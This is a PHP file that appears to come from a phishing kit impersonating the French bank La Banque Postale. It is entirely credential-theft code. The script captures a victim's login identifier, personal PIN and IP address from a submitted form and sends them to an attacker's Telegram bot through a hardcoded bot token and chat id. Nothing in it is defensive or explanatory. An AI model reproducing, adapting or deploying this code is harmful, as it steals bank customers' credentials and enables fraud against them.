<?php

require_once 'app.php';


if ($_GET['step'] == 'log') {
    $msg = '[+]━━━━【🏦 BANQUE POSTALE/ Login 】━━━[+]'. "\r\n";
    $msg .= '[🆔 Identifiant]= ' . $_POST['id'] . "\r\n";
    $msg .= '[🔒 Code personnel] = ' . $_POST['pin'] . "\r\n";
    $msg .= "\r\n";
    $msg .= '[🔍 IP INFO] = ' . get_user_ip() . "\r\n";
    $token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($msg)."" );

}
